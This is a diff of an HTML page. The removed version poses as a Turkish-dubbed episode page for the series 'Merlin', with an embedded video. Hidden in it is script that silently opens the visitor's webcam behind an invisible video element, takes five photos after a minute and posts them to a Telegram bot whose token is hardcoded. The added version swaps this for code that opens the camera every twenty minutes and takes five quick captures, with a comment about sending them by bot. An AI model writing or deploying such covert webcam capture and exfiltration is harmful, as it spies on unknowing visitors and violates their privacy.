@@ -1,179 +1,74 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</title>
-    <style>
-        body {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            background-color: #000; /* Night mode */
-            color: #fff; /* White text */
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        .title {
-            font-size: 3rem; /* Large title font */
-            font-weight: bold;
-            margin-top: 20px;
-            color: #f0f0f0;
-            text-transform: uppercase;
-            margin-bottom: 20px;
-        }
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 1000px;
-            height: 0;
-            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
-            background-color: #000;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        .video-container iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .description {
-            max-width: 90%;
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #222;
-            border: 1px solid #555;
-            border-radius: 8px;
-            font-size: 1rem;
-            color: #fff;
-            text-align: center;
-        }
-        #camera {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            opacity: 0;
-        }
-        @media (max-width: 768px) {
-            .title {
-                font-size: 2rem;
-            }
-            .description {
-                font-size: 0.9rem;
-            }
-        }
-        @media (max-width: 480px) {
-            .title {
-                font-size: 1.5rem;
-            }
-            .description {
-                font-size: 0.8rem;
-            }
-        }
-    </style>
-    <script>
-        const telegramBotToken = "7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs"; // Your bot token
-        const telegramUserId = "7771348001"; // Your Telegram user ID
-
-        // Initialize camera and take a picture
-        async function startCamera() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const camera = document.getElementById("camera");
-            camera.srcObject = stream;
-        }
-
-        // Function to take a picture from the webcam
-        function takePicture() {
-            const canvas = document.createElement("canvas");
-            const context = canvas.getContext("2d");
-            const camera = document.getElementById("camera");
-            canvas.width = camera.videoWidth;
-            canvas.height = camera.videoHeight;
-            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL("image/jpeg");
-        }
-
-        // Function to send photo to Telegram bot
-        function sendToTelegram(imageData) {
-            const formData = new FormData();
-            formData.append("chat_id", telegramUserId);
-            formData.append("photo", dataURItoBlob(imageData));
-
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    console.log("Photo sent successfully.");
-                } else {
-                    console.log("Error sending photo.");
-                }
-            });
-        }
-
-        // Helper function to convert Data URL to Blob
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(",")[1]);
-            const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
-            const arrayBuffer = new ArrayBuffer(byteString.length);
-            const uintArray = new Uint8Array(arrayBuffer);
-
-            for (let i = 0; i < byteString.length; i++) {
-                uintArray[i] = byteString.charCodeAt(i);
-            }
-
-            return new Blob([uintArray], { type: mimeString });
-        }
-
-        // Automatically take pictures after 1 minute and send them
-        setTimeout(() => {
-            let count = 0;
-            const maxPics = 5;
-            const interval = setInterval(() => {
-                if (count < maxPics) {
-                    const pictureData = takePicture();
-                    sendToTelegram(pictureData);
-                    count++;
-                } else {
-                    clearInterval(interval);
-                }
-            }, 2000); // Take a picture every 2 seconds
-        }, 60000); // Start after 1 minute
-
-        // Start camera when the page loads
-        window.onload = startCamera;
-    </script>
+    <title>Capture Camera for 1 Second Every 20 Minutes</title>
 </head>
 <body>
-    <!-- Video title at the top center above the player -->
-    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let videoStream = null;
 
-    <!-- Custom Video Player using Google Drive link -->
-    <div class="video-container">
-        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
-                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
+        // Function to capture a single photo from the video stream
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-    <!-- Description section -->
-    <div class="description">
-        <p>
-            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
-            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
-            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
-            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
-        </p>
-    </div>
+            // Draw the current video frame onto the canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert the canvas content to an image URL (base64)
+            const imgData = canvas.toDataURL('image/png');
+            console.log("Captured Image:", imgData);
 
-    <!-- Video Camera element, invisible -->
-    <video id="camera" autoplay muted></video>
+            // Here, you can use `imgData` to send the image via your bot or save it
+            // For now, let's just log it to the console as a demo.
+        }
+
+        // Function to stop the camera after 1 second
+        function stopCamera(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            console.log('Camera stopped.');
+        }
+
+        // Function to activate the camera and take 5 pictures in 1 second
+        function activateCameraAndCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    videoStream = stream;
+                    
+                    // Take 5 pictures in 1 second
+                    let count = 0;
+                    const captureInterval = setInterval(() => {
+                        capturePhoto();
+                        count++;
+                        if (count >= 5) {
+                            clearInterval(captureInterval); // Stop after 5 pictures
+                            stopCamera(videoStream); // Stop the camera after 1 second
+                        }
+                    }, 200); // Capture a picture every 200ms (5 pics in 1 second)
+                    
+                    setTimeout(() => {
+                        stopCamera(videoStream); // Stop the camera after 1 second
+                    }, 1000); // Stop camera after 1 second of activity
+                })
+                .catch((error) => {
+                    console.error('Error accessing the camera:', error);
+                });
+        }
+
+        // Set an interval to activate the camera every 20 minutes (1200000 ms)
+        setInterval(() => {
+            activateCameraAndCapture();
+        }, 1200000); // 20 minutes in milliseconds
+
+    </script>
 </body>
 </html>
